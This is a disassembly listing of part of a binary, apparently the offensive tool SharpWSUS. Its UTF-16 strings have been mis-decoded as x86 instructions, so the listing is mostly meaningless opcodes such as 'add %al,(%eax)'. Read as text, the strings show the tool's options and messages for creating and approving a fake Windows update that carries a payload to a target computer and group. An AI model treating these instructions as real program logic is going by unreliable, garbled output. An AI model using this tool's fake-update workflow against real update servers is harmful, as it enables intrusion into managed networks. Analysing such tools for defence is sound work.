  40bcdf:	20 00                	and    %al,(%eax)
  40bce1:	41                   	inc    %ecx
  40bce2:	00 70 00             	add    %dh,0x0(%eax)
  40bce5:	70 00                	jo     0x40bce7
  40bce7:	72 00                	jb     0x40bce9
  40bce9:	6f                   	outsl  %ds:(%esi),(%dx)
  40bcea:	00 76 00             	add    %dh,0x0(%esi)
  40bced:	65 00 20             	add    %ah,%gs:(%eax)
  40bcf0:	00 55 00             	add    %dl,0x0(%ebp)
  40bcf3:	70 00                	jo     0x40bcf5
  40bcf5:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40bcf9:	74 00                	je     0x40bcfb
  40bcfb:	65 00 00             	add    %al,%gs:(%eax)
  40bcfe:	17                   	pop    %ss
  40bcff:	49                   	dec    %ecx
  40bd00:	00 6e 00             	add    %ch,0x0(%esi)
  40bd03:	6a 00                	push   $0x0
  40bd05:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40bd09:	74 00                	je     0x40bd0b
  40bd0b:	47                   	inc    %edi
  40bd0c:	00 72 00             	add    %dh,0x0(%edx)
  40bd0f:	6f                   	outsl  %ds:(%esi),(%dx)
  40bd10:	00 75 00             	add    %dh,0x0(%ebp)
  40bd13:	70 00                	jo     0x40bd15
  40bd15:	00 15 57 00 55 00    	add    %dl,0x550057
  40bd1b:	53                   	push   %ebx
  40bd1c:	00 20                	add    %ah,(%eax)
  40bd1e:	00 53 00             	add    %dl,0x0(%ebx)
  40bd21:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40bd25:	76 00                	jbe    0x40bd27
  40bd27:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40bd2b:	00 13                	add    %dl,(%ebx)
  40bd2d:	2f                   	das
  40bd2e:	00 75 00             	add    %dh,0x0(%ebp)
  40bd31:	70 00                	jo     0x40bd33
  40bd33:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40bd37:	74 00                	je     0x40bd39
  40bd39:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  40bd3d:	64 00 00             	add    %al,%fs:(%eax)
  40bd40:	1b 2f                	sbb    (%edi),%ebp
  40bd42:	00 63 00             	add    %ah,0x0(%ebx)
  40bd45:	6f                   	outsl  %ds:(%esi),(%dx)
  40bd46:	00 6d 00             	add    %ch,0x0(%ebp)
  40bd49:	70 00                	jo     0x40bd4b
  40bd4b:	75 00                	jne    0x40bd4d
  40bd4d:	74 00                	je     0x40bd4f
  40bd4f:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40bd53:	6e                   	outsb  %ds:(%esi),(%dx)
  40bd54:	00 61 00             	add    %ah,0x0(%ecx)
  40bd57:	6d                   	insl   (%dx),%es:(%edi)
  40bd58:	00 65 00             	add    %ah,0x0(%ebp)
  40bd5b:	00 15 2f 00 67 00    	add    %dl,0x67002f
  40bd61:	72 00                	jb     0x40bd63
  40bd63:	6f                   	outsl  %ds:(%esi),(%dx)
  40bd64:	00 75 00             	add    %dh,0x0(%ebp)
  40bd67:	70 00                	jo     0x40bd69
  40bd69:	6e                   	outsb  %ds:(%esi),(%dx)
  40bd6a:	00 61 00             	add    %ah,0x0(%ecx)
  40bd6d:	6d                   	insl   (%dx),%es:(%edi)
  40bd6e:	00 65 00             	add    %ah,0x0(%ebp)
  40bd71:	00 13                	add    %dl,(%ebx)
  40bd73:	2f                   	das
  40bd74:	00 61 00             	add    %ah,0x0(%ecx)
  40bd77:	70 00                	jo     0x40bd79
  40bd79:	70 00                	jo     0x40bd7b
  40bd7b:	72 00                	jb     0x40bd7d
  40bd7d:	6f                   	outsl  %ds:(%esi),(%dx)
  40bd7e:	00 76 00             	add    %dh,0x0(%esi)
  40bd81:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40bd85:	00 25 47 00 72 00    	add    %ah,0x720047
  40bd8b:	6f                   	outsl  %ds:(%esi),(%dx)
  40bd8c:	00 75 00             	add    %dh,0x0(%ebp)
  40bd8f:	70 00                	jo     0x40bd91
  40bd91:	20 00                	and    %al,(%eax)
  40bd93:	45                   	inc    %ebp
  40bd94:	00 78 00             	add    %bh,0x0(%eax)
  40bd97:	69 00 73 00 74 00    	imul   $0x740073,(%eax),%eax
  40bd9d:	73 00                	jae    0x40bd9f
  40bd9f:	20 00                	and    %al,(%eax)
  40bda1:	3d 00 20 00 7b       	cmp    $0x7b002000,%eax
  40bda6:	00 30                	add    %dh,(%eax)
  40bda8:	00 7d 00             	add    %bh,0x0(%ebp)
  40bdab:	00 31                	add    %dh,(%ecx)
  40bdad:	0d 00 0a 00 5b       	or     $0x5b000a00,%eax
  40bdb2:	00 2a                	add    %ch,(%edx)
  40bdb4:	00 5d 00             	add    %bl,0x0(%ebp)
  40bdb7:	20 00                	and    %al,(%eax)
  40bdb9:	41                   	inc    %ecx
  40bdba:	00 70 00             	add    %dh,0x0(%eax)
  40bdbd:	70 00                	jo     0x40bdbf
  40bdbf:	72 00                	jb     0x40bdc1
  40bdc1:	6f                   	outsl  %ds:(%esi),(%dx)
  40bdc2:	00 76 00             	add    %dh,0x0(%esi)
  40bdc5:	65 00 20             	add    %ah,%gs:(%eax)
  40bdc8:	00 63 00             	add    %ah,0x0(%ebx)
  40bdcb:	6f                   	outsl  %ds:(%esi),(%dx)
  40bdcc:	00 6d 00             	add    %ch,0x0(%ebp)
  40bdcf:	70 00                	jo     0x40bdd1
  40bdd1:	6c                   	insb   (%dx),%es:(%edi)
  40bdd2:	00 65 00             	add    %ah,0x0(%ebp)
  40bdd5:	74 00                	je     0x40bdd7
  40bdd7:	65 00 0d 00 0a 00 00 	add    %cl,%gs:0xa00
  40bdde:	0b 63 00             	or     0x0(%ebx),%esp
  40bde1:	68 00 65 00 63       	push   $0x63006500
  40bde6:	00 6b 00             	add    %ch,0x0(%ebx)
  40bde9:	00 31                	add    %dh,(%ecx)
  40bdeb:	5b                   	pop    %ebx
  40bdec:	00 2a                	add    %ch,(%edx)
  40bdee:	00 5d 00             	add    %bl,0x0(%ebp)
  40bdf1:	20 00                	and    %al,(%eax)
  40bdf3:	41                   	inc    %ecx
  40bdf4:	00 63 00             	add    %ah,0x0(%ebx)
  40bdf7:	74 00                	je     0x40bdf9
  40bdf9:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40bdff:	3a 00                	cmp    (%eax),%al
  40be01:	20 00                	and    %al,(%eax)
  40be03:	43                   	inc    %ebx
  40be04:	00 68 00             	add    %ch,0x0(%eax)
  40be07:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40be0b:	6b 00 20             	imul   $0x20,(%eax),%eax
  40be0e:	00 55 00             	add    %dl,0x0(%ebp)
  40be11:	70 00                	jo     0x40be13
  40be13:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40be17:	74 00                	je     0x40be19
  40be19:	65 00 00             	add    %al,%gs:(%eax)
  40be1c:	2d 0d 00 0a 00       	sub    $0xa000d,%eax
  40be21:	5b                   	pop    %ebx
  40be22:	00 2a                	add    %ch,(%edx)
  40be24:	00 5d 00             	add    %bl,0x0(%ebp)
  40be27:	20 00                	and    %al,(%eax)
  40be29:	43                   	inc    %ebx
  40be2a:	00 68 00             	add    %ch,0x0(%eax)
  40be2d:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40be31:	6b 00 20             	imul   $0x20,(%eax),%eax
  40be34:	00 63 00             	add    %ah,0x0(%ebx)
  40be37:	6f                   	outsl  %ds:(%esi),(%dx)
  40be38:	00 6d 00             	add    %ch,0x0(%ebp)
  40be3b:	70 00                	jo     0x40be3d
  40be3d:	6c                   	insb   (%dx),%es:(%edi)
  40be3e:	00 65 00             	add    %ah,0x0(%ebp)
  40be41:	74 00                	je     0x40be43
  40be43:	65 00 0d 00 0a 00 00 	add    %cl,%gs:0xa00
  40be4a:	0d 63 00 72 00       	or     $0x720063,%eax
  40be4f:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40be53:	74 00                	je     0x40be55
  40be55:	65 00 00             	add    %al,%gs:(%eax)
  40be58:	33 5b 00             	xor    0x0(%ebx),%ebx
  40be5b:	2a 00                	sub    (%eax),%al
  40be5d:	5d                   	pop    %ebp
  40be5e:	00 20                	add    %ah,(%eax)
  40be60:	00 41 00             	add    %al,0x0(%ecx)
  40be63:	63 00                	arpl   %eax,(%eax)
  40be65:	74 00                	je     0x40be67
  40be67:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40be6d:	3a 00                	cmp    (%eax),%al
  40be6f:	20 00                	and    %al,(%eax)
  40be71:	43                   	inc    %ebx
  40be72:	00 72 00             	add    %dh,0x0(%edx)
  40be75:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40be79:	74 00                	je     0x40be7b
  40be7b:	65 00 20             	add    %ah,%gs:(%eax)
  40be7e:	00 55 00             	add    %dl,0x0(%ebp)
  40be81:	70 00                	jo     0x40be83
  40be83:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40be87:	74 00                	je     0x40be89
  40be89:	65 00 00             	add    %al,%gs:(%eax)
  40be8c:	11 2f                	adc    %ebp,(%edi)
  40be8e:	00 70 00             	add    %dh,0x0(%eax)
  40be91:	61                   	popa
  40be92:	00 79 00             	add    %bh,0x0(%ecx)
  40be95:	6c                   	insb   (%dx),%es:(%edi)
  40be96:	00 6f 00             	add    %ch,0x0(%edi)
  40be99:	61                   	popa
  40be9a:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  40be9e:	0b 2f                	or     (%edi),%ebp
  40bea0:	00 61 00             	add    %ah,0x0(%ecx)
  40bea3:	72 00                	jb     0x40bea5
  40bea5:	67 00 73 00          	add    %dh,0x0(%bp,%di)
  40bea9:	00 0d 2f 00 74 00    	add    %cl,0x74002f
  40beaf:	69 00 74 00 6c 00    	imul   $0x6c0074,(%eax),%eax
  40beb5:	65 00 00             	add    %al,%gs:(%eax)
  40beb8:	0b 2f                	or     (%edi),%ebp
  40beba:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  40bebe:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40bec2:	00 00                	add    %al,(%eax)
  40bec4:	0f 2f 00             	comiss (%eax),%xmm0
  40bec7:	72 00                	jb     0x40bec9
  40bec9:	61                   	popa
  40beca:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40bece:	00 6e 00             	add    %ch,0x0(%esi)
  40bed1:	67 00 00             	add    %al,(%bx,%si)
  40bed4:	0b 2f                	or     (%edi),%ebp
  40bed6:	00 6d 00             	add    %ch,0x0(%ebp)
  40bed9:	73 00                	jae    0x40bedb
  40bedb:	72 00                	jb     0x40bedd
  40bedd:	63 00                	arpl   %eax,(%eax)
  40bedf:	00 07                	add    %al,(%edi)
  40bee1:	2f                   	das
  40bee2:	00 6b 00             	add    %ch,0x0(%ebx)
  40bee5:	62 00                	bound  %eax,(%eax)
  40bee7:	00 19                	add    %bl,(%ecx)
  40bee9:	2f                   	das
  40beea:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40beee:	00 73 00             	add    %dh,0x0(%ebx)
  40bef1:	63 00                	arpl   %eax,(%eax)
  40bef3:	72 00                	jb     0x40bef5
  40bef5:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  40befb:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40bf01:	00 09                	add    %cl,(%ecx)
  40bf03:	2f                   	das
  40bf04:	00 75 00             	add    %dh,0x0(%ebp)
  40bf07:	72 00                	jb     0x40bf09
  40bf09:	6c                   	insb   (%dx),%es:(%edi)
  40bf0a:	00 00                	add    %al,(%eax)
  40bf0c:	51                   	push   %ecx
  40bf0d:	5b                   	pop    %ebx
  40bf0e:	00 2a                	add    %ch,(%edx)
  40bf10:	00 5d 00             	add    %bl,0x0(%ebp)
  40bf13:	20 00                	and    %al,(%eax)
  40bf15:	43                   	inc    %ebx
  40bf16:	00 72 00             	add    %dh,0x0(%edx)
  40bf19:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40bf1d:	74 00                	je     0x40bf1f
  40bf1f:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40bf25:	20 00                	and    %al,(%eax)
  40bf27:	70 00                	jo     0x40bf29
  40bf29:	61                   	popa
  40bf2a:	00 74 00 63          	add    %dh,0x63(%eax,%eax,1)
  40bf2e:	00 68 00             	add    %ch,0x0(%eax)
  40bf31:	20 00                	and    %al,(%eax)
  40bf33:	74 00                	je     0x40bf35
  40bf35:	6f                   	outsl  %ds:(%esi),(%dx)
  40bf36:	00 20                	add    %ah,(%eax)
  40bf38:	00 75 00             	add    %dh,0x0(%ebp)
  40bf3b:	73 00                	jae    0x40bf3d
  40bf3d:	65 00 20             	add    %ah,%gs:(%eax)
  40bf40:	00 74 00 68          	add    %dh,0x68(%eax,%eax,1)
  40bf44:	00 65 00             	add    %ah,0x0(%ebp)
  40bf47:	20 00                	and    %al,(%eax)
  40bf49:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40bf4d:	6c                   	insb   (%dx),%es:(%edi)
  40bf4e:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  40bf52:	00 77 00             	add    %dh,0x0(%edi)
  40bf55:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40bf5b:	3a 00                	cmp    (%eax),%al
  40bf5d:	00 21                	add    %ah,(%ecx)
  40bf5f:	5b                   	pop    %ebx
  40bf60:	00 2a                	add    %ch,(%edx)
  40bf62:	00 5d 00             	add    %bl,0x0(%ebp)
  40bf65:	20 00                	and    %al,(%eax)
  40bf67:	50                   	push   %eax
  40bf68:	00 61 00             	add    %ah,0x0(%ecx)
  40bf6b:	79 00                	jns    0x40bf6d
  40bf6d:	6c                   	insb   (%dx),%es:(%edi)
  40bf6e:	00 6f 00             	add    %ch,0x0(%edi)
  40bf71:	61                   	popa
  40bf72:	00 64 00 3a          	add    %ah,0x3a(%eax,%eax,1)
  40bf76:	00 20                	add    %ah,(%eax)
  40bf78:	00 7b 00             	add    %bh,0x0(%ebx)
  40bf7b:	30 00                	xor    %al,(%eax)
  40bf7d:	7d 00                	jge    0x40bf7f
  40bf7f:	00 2b                	add    %ch,(%ebx)
  40bf81:	5b                   	pop    %ebx
  40bf82:	00 2a                	add    %ch,(%edx)
  40bf84:	00 5d 00             	add    %bl,0x0(%ebp)
  40bf87:	20 00                	and    %al,(%eax)
  40bf89:	50                   	push   %eax
  40bf8a:	00 61 00             	add    %ah,0x0(%ecx)
  40bf8d:	79 00                	jns    0x40bf8f
  40bf8f:	6c                   	insb   (%dx),%es:(%edi)
  40bf90:	00 6f 00             	add    %ch,0x0(%edi)
  40bf93:	61                   	popa
  40bf94:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40bf98:	00 50 00             	add    %dl,0x0(%eax)
  40bf9b:	61                   	popa
  40bf9c:	00 74 00 68          	add    %dh,0x68(%eax,%eax,1)
  40bfa0:	00 3a                	add    %bh,(%edx)
  40bfa2:	00 20                	add    %ah,(%eax)
  40bfa4:	00 7b 00             	add    %bh,0x0(%ebx)
  40bfa7:	30 00                	xor    %al,(%eax)
  40bfa9:	7d 00                	jge    0x40bfab
  40bfab:	00 25 5b 00 2a 00    	add    %ah,0x2a005b
  40bfb1:	5d                   	pop    %ebp
  40bfb2:	00 20                	add    %ah,(%eax)
  40bfb4:	00 41 00             	add    %al,0x0(%ecx)
  40bfb7:	72 00                	jb     0x40bfb9
  40bfb9:	67 00 75 00          	add    %dh,0x0(%di)
  40bfbd:	6d                   	insl   (%dx),%es:(%edi)
  40bfbe:	00 65 00             	add    %ah,0x0(%ebp)
  40bfc1:	6e                   	outsb  %ds:(%esi),(%dx)
  40bfc2:	00 74 00 73          	add    %dh,0x73(%eax,%eax,1)
  40bfc6:	00 3a                	add    %bh,(%edx)
  40bfc8:	00 20                	add    %ah,(%eax)
  40bfca:	00 7b 00             	add    %bh,0x0(%ebx)
  40bfcd:	30 00                	xor    %al,(%eax)
  40bfcf:	7d 00                	jge    0x40bfd1
  40bfd1:	00 43 5b             	add    %al,0x5b(%ebx)
  40bfd4:	00 2a                	add    %ch,(%edx)
  40bfd6:	00 5d 00             	add    %bl,0x0(%ebp)
  40bfd9:	20 00                	and    %al,(%eax)
  40bfdb:	41                   	inc    %ecx
  40bfdc:	00 72 00             	add    %dh,0x0(%edx)
  40bfdf:	67 00 75 00          	add    %dh,0x0(%di)
  40bfe3:	6d                   	insl   (%dx),%es:(%edi)
  40bfe4:	00 65 00             	add    %ah,0x0(%ebp)
  40bfe7:	6e                   	outsb  %ds:(%esi),(%dx)
  40bfe8:	00 74 00 73          	add    %dh,0x73(%eax,%eax,1)
  40bfec:	00 20                	add    %ah,(%eax)
  40bfee:	00 28                	add    %ch,(%eax)
  40bff0:	00 48 00             	add    %cl,0x0(%eax)
  40bff3:	54                   	push   %esp
  40bff4:	00 4d 00             	add    %cl,0x0(%ebp)
  40bff7:	4c                   	dec    %esp
  40bff8:	00 20                	add    %ah,(%eax)
  40bffa:	00 45 00             	add    %al,0x0(%ebp)
  40bffd:	6e                   	outsb  %ds:(%esi),(%dx)
  40bffe:	00 63 00             	add    %ah,0x0(%ebx)
  40c001:	6f                   	outsl  %ds:(%esi),(%dx)
  40c002:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40c006:	00 64 00 29          	add    %ah,0x29(%eax,%eax,1)
  40c00a:	00 3a                	add    %bh,(%edx)
  40c00c:	00 20                	add    %ah,(%eax)
  40c00e:	00 7b 00             	add    %bh,0x0(%ebx)
  40c011:	30 00                	xor    %al,(%eax)
  40c013:	7d 00                	jge    0x40c015
  40c015:	00 80 8d 0d 00 0a    	add    %al,0xa000d8d(%eax)
  40c01b:	00 5b 00             	add    %bl,0x0(%ebx)
  40c01e:	2a 00                	sub    (%eax),%al
  40c020:	5d                   	pop    %ebp
  40c021:	00 20                	add    %ah,(%eax)
  40c023:	00 55 00             	add    %dl,0x0(%ebp)
  40c026:	70 00                	jo     0x40c028
  40c028:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40c02c:	74 00                	je     0x40c02e
  40c02e:	65 00 20             	add    %ah,%gs:(%eax)
  40c031:	00 63 00             	add    %ah,0x0(%ebx)
  40c034:	72 00                	jb     0x40c036
  40c036:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40c03a:	74 00                	je     0x40c03c
  40c03c:	65 00 64 00 20       	add    %ah,%gs:0x20(%eax,%eax,1)
  40c041:	00 2d 00 20 00 57    	add    %ch,0x57002000
  40c047:	00 68 00             	add    %ch,0x0(%eax)
  40c04a:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40c04e:	20 00                	and    %al,(%eax)
  40c050:	72 00                	jb     0x40c052
  40c052:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40c056:	64 00 79 00          	add    %bh,%fs:0x0(%ecx)
  40c05a:	20 00                	and    %al,(%eax)
  40c05c:	74 00                	je     0x40c05e
  40c05e:	6f                   	outsl  %ds:(%esi),(%dx)
  40c05f:	00 20                	add    %ah,(%eax)
  40c061:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40c065:	00 70 00             	add    %dh,0x0(%eax)
  40c068:	6c                   	insb   (%dx),%es:(%edi)
  40c069:	00 6f 00             	add    %ch,0x0(%edi)
  40c06c:	79 00                	jns    0x40c06e
  40c06e:	20 00                	and    %al,(%eax)
  40c070:	75 00                	jne    0x40c072
  40c072:	73 00                	jae    0x40c074
  40c074:	65 00 20             	add    %ah,%gs:(%eax)
  40c077:	00 74 00 68          	add    %dh,0x68(%eax,%eax,1)
  40c07b:	00 65 00             	add    %ah,0x0(%ebp)
  40c07e:	20 00                	and    %al,(%eax)
  40c080:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40c084:	6c                   	insb   (%dx),%es:(%edi)
  40c085:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  40c089:	00 77 00             	add    %dh,0x0(%edi)
  40c08c:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40c092:	20 00                	and    %al,(%eax)
  40c094:	63 00                	arpl   %eax,(%eax)
  40c096:	6f                   	outsl  %ds:(%esi),(%dx)
  40c097:	00 6d 00             	add    %ch,0x0(%ebp)
  40c09a:	6d                   	insl   (%dx),%es:(%edi)
  40c09b:	00 61 00             	add    %ah,0x0(%ecx)
  40c09e:	6e                   	outsb  %ds:(%esi),(%dx)
  40c09f:	00 64 00 3a          	add    %ah,0x3a(%eax,%eax,1)
  40c0a3:	00 01                	add    %al,(%ecx)
  40c0a5:	49                   	dec    %ecx
  40c0a6:	5b                   	pop    %ebx
  40c0a7:	00 2a                	add    %ch,(%edx)
  40c0a9:	00 5d 00             	add    %bl,0x0(%ebp)
  40c0ac:	20 00                	and    %al,(%eax)
  40c0ae:	53                   	push   %ebx
  40c0af:	00 68 00             	add    %ch,0x0(%eax)
  40c0b2:	61                   	popa
  40c0b3:	00 72 00             	add    %dh,0x0(%edx)
  40c0b6:	70 00                	jo     0x40c0b8
  40c0b8:	57                   	push   %edi
  40c0b9:	00 53 00             	add    %dl,0x0(%ebx)
  40c0bc:	55                   	push   %ebp
  40c0bd:	00 53 00             	add    %dl,0x0(%ebx)
  40c0c0:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  40c0c4:	78 00                	js     0x40c0c6
  40c0c6:	65 00 20             	add    %ah,%gs:(%eax)
  40c0c9:	00 61 00             	add    %ah,0x0(%ecx)
  40c0cc:	70 00                	jo     0x40c0ce
  40c0ce:	70 00                	jo     0x40c0d0
  40c0d0:	72 00                	jb     0x40c0d2
  40c0d2:	6f                   	outsl  %ds:(%esi),(%dx)
  40c0d3:	00 76 00             	add    %dh,0x0(%esi)
  40c0d6:	65 00 20             	add    %ah,%gs:(%eax)
  40c0d9:	00 2f                	add    %ch,(%edi)
  40c0db:	00 75 00             	add    %dh,0x0(%ebp)
  40c0de:	70 00                	jo     0x40c0e0
  40c0e0:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40c0e4:	74 00                	je     0x40c0e6
  40c0e6:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  40c0ea:	64 00 3a             	add    %bh,%fs:(%edx)
  40c0ed:	00 00                	add    %al,(%eax)
  40c0ef:	65 20 00             	and    %al,%gs:(%eax)
  40c0f2:	2f                   	das
  40c0f3:	00 63 00             	add    %ah,0x0(%ebx)
  40c0f6:	6f                   	outsl  %ds:(%esi),(%dx)
  40c0f7:	00 6d 00             	add    %ch,0x0(%ebp)
  40c0fa:	70 00                	jo     0x40c0fc
  40c0fc:	75 00                	jne    0x40c0fe
  40c0fe:	74 00                	je     0x40c100
  40c100:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c104:	6e                   	outsb  %ds:(%esi),(%dx)
  40c105:	00 61 00             	add    %ah,0x0(%ecx)
  40c108:	6d                   	insl   (%dx),%es:(%edi)
  40c109:	00 65 00             	add    %ah,0x0(%ebp)
  40c10c:	3a 00                	cmp    (%eax),%al
  40c10e:	54                   	push   %esp
  40c10f:	00 61 00             	add    %ah,0x0(%ecx)
  40c112:	72 00                	jb     0x40c114
  40c114:	67 00 65 00          	add    %ah,0x0(%di)
  40c118:	74 00                	je     0x40c11a
  40c11a:	2e 00 46 00          	add    %al,%cs:0x0(%esi)
  40c11e:	51                   	push   %ecx
  40c11f:	00 44 00 4e          	add    %al,0x4e(%eax,%eax,1)
  40c123:	00 20                	add    %ah,(%eax)
  40c125:	00 2f                	add    %ch,(%edi)
  40c127:	00 67 00             	add    %ah,0x0(%edi)
  40c12a:	72 00                	jb     0x40c12c
  40c12c:	6f                   	outsl  %ds:(%esi),(%dx)
  40c12d:	00 75 00             	add    %dh,0x0(%ebp)
  40c130:	70 00                	jo     0x40c132
  40c132:	6e                   	outsb  %ds:(%esi),(%dx)
  40c133:	00 61 00             	add    %ah,0x0(%ecx)
  40c136:	6d                   	insl   (%dx),%es:(%edi)
  40c137:	00 65 00             	add    %ah,0x0(%ebp)
  40c13a:	3a 00                	cmp    (%eax),%al
  40c13c:	22 00                	and    (%eax),%al
  40c13e:	47                   	inc    %edi
  40c13f:	00 72 00             	add    %dh,0x0(%edx)
  40c142:	6f                   	outsl  %ds:(%esi),(%dx)
  40c143:	00 75 00             	add    %dh,0x0(%ebp)
  40c146:	70 00                	jo     0x40c148
  40c148:	20 00                	and    %al,(%eax)
  40c14a:	4e                   	dec    %esi
  40c14b:	00 61 00             	add    %ah,0x0(%ecx)
  40c14e:	6d                   	insl   (%dx),%es:(%edi)
  40c14f:	00 65 00             	add    %ah,0x0(%ebp)
  40c152:	22 00                	and    (%eax),%al
  40c154:	00 7d 0d             	add    %bh,0xd(%ebp)
  40c157:	00 0a                	add    %cl,(%edx)
  40c159:	00 5b 00             	add    %bl,0x0(%ebx)
  40c15c:	2a 00                	sub    (%eax),%al
  40c15e:	5d                   	pop    %ebp
  40c15f:	00 20                	add    %ah,(%eax)
  40c161:	00 54 00 6f          	add    %dl,0x6f(%eax,%eax,1)
  40c165:	00 20                	add    %ah,(%eax)
  40c167:	00 63 00             	add    %ah,0x0(%ebx)
  40c16a:	68 00 65 00 63       	push   $0x63006500
  40c16f:	00 6b 00             	add    %ch,0x0(%ebx)
  40c172:	20 00                	and    %al,(%eax)
  40c174:	6f                   	outsl  %ds:(%esi),(%dx)
  40c175:	00 6e 00             	add    %ch,0x0(%esi)
  40c178:	20 00                	and    %al,(%eax)
  40c17a:	74 00                	je     0x40c17c
  40c17c:	68 00 65 00 20       	push   $0x20006500
  40c181:	00 75 00             	add    %dh,0x0(%ebp)
  40c184:	70 00                	jo     0x40c186
  40c186:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40c18a:	74 00                	je     0x40c18c
  40c18c:	65 00 20             	add    %ah,%gs:(%eax)
  40c18f:	00 73 00             	add    %dh,0x0(%ebx)
  40c192:	74 00                	je     0x40c194
  40c194:	61                   	popa
  40c195:	00 74 00 75          	add    %dh,0x75(%eax,%eax,1)
  40c199:	00 73 00             	add    %dh,0x0(%ebx)
  40c19c:	20 00                	and    %al,(%eax)
  40c19e:	75 00                	jne    0x40c1a0
  40c1a0:	73 00                	jae    0x40c1a2
  40c1a2:	65 00 20             	add    %ah,%gs:(%eax)
  40c1a5:	00 74 00 68          	add    %dh,0x68(%eax,%eax,1)
  40c1a9:	00 65 00             	add    %ah,0x0(%ebp)
  40c1ac:	20 00                	and    %al,(%eax)
  40c1ae:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40c1b2:	6c                   	insb   (%dx),%es:(%edi)
  40c1b3:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  40c1b7:	00 77 00             	add    %dh,0x0(%edi)
  40c1ba:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40c1c0:	20 00                	and    %al,(%eax)
  40c1c2:	63 00                	arpl   %eax,(%eax)
  40c1c4:	6f                   	outsl  %ds:(%esi),(%dx)
  40c1c5:	00 6d 00             	add    %ch,0x0(%ebp)
  40c1c8:	6d                   	insl   (%dx),%es:(%edi)
  40c1c9:	00 61 00             	add    %ah,0x0(%ecx)
  40c1cc:	6e                   	outsb  %ds:(%esi),(%dx)
  40c1cd:	00 64 00 3a          	add    %ah,0x3a(%eax,%eax,1)
  40c1d1:	00 00                	add    %al,(%eax)
  40c1d3:	45                   	inc    %ebp
  40c1d4:	5b                   	pop    %ebx
  40c1d5:	00 2a                	add    %ch,(%edx)
  40c1d7:	00 5d 00             	add    %bl,0x0(%ebp)
  40c1da:	20 00                	and    %al,(%eax)
  40c1dc:	53                   	push   %ebx
  40c1dd:	00 68 00             	add    %ch,0x0(%eax)
  40c1e0:	61                   	popa
  40c1e1:	00 72 00             	add    %dh,0x0(%edx)
  40c1e4:	70 00                	jo     0x40c1e6
  40c1e6:	57                   	push   %edi
  40c1e7:	00 53 00             	add    %dl,0x0(%ebx)
  40c1ea:	55                   	push   %ebp
  40c1eb:	00 53 00             	add    %dl,0x0(%ebx)
  40c1ee:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  40c1f2:	78 00                	js     0x40c1f4
  40c1f4:	65 00 20             	add    %ah,%gs:(%eax)
  40c1f7:	00 63 00             	add    %ah,0x0(%ebx)
  40c1fa:	68 00 65 00 63       	push   $0x63006500
  40c1ff:	00 6b 00             	add    %ch,0x0(%ebx)
  40c202:	20 00                	and    %al,(%eax)
  40c204:	2f                   	das
  40c205:	00 75 00             	add    %dh,0x0(%ebp)
  40c208:	70 00                	jo     0x40c20a
  40c20a:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40c20e:	74 00                	je     0x40c210
  40c210:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  40c214:	64 00 3a             	add    %bh,%fs:(%edx)
  40c217:	00 00                	add    %al,(%eax)
  40c219:	35 20 00 2f 00       	xor    $0x2f0020,%eax
  40c21e:	63 00                	arpl   %eax,(%eax)
  40c220:	6f                   	outsl  %ds:(%esi),(%dx)
  40c221:	00 6d 00             	add    %ch,0x0(%ebp)
  40c224:	70 00                	jo     0x40c226
  40c226:	75 00                	jne    0x40c228
  40c228:	74 00                	je     0x40c22a
  40c22a:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c22e:	6e                   	outsb  %ds:(%esi),(%dx)
  40c22f:	00 61 00             	add    %ah,0x0(%ecx)
  40c232:	6d                   	insl   (%dx),%es:(%edi)
  40c233:	00 65 00             	add    %ah,0x0(%ebp)
  40c236:	3a 00                	cmp    (%eax),%al
  40c238:	54                   	push   %esp
  40c239:	00 61 00             	add    %ah,0x0(%ecx)
  40c23c:	72 00                	jb     0x40c23e
